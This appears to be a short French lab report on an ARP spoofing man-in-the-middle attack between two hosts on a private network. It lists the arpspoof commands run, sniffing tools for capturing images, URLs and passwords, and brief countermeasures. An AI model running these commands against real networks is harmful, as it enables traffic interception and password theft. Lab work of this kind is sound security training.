# ARP Poisoning - Rapport d'attaque

## Objectif
Attaque de l'homme du milieu (MITM) pour intercepter le trafic entre PC1 et PC2.

## Principe
L'attaque ARP Spoofing consiste a envoyer de fausses reponses ARP pour associer l'adresse MAC de l'attaquant a l'adresse IP de la cible.

## Commandes executees
arpspoof -i eth0 -t 10.0.0.10 10.0.0.20
arpspoof -i eth0 -t 10.0.0.20 10.0.0.10

## Resultats attendus
- driftnet -i eth0 (images)
- urlsnarf -i eth0 (URLs)
- dsniff -i eth0 (mots de passe)

## Contre-mesures
ARP statique, arpwatch, HTTPS
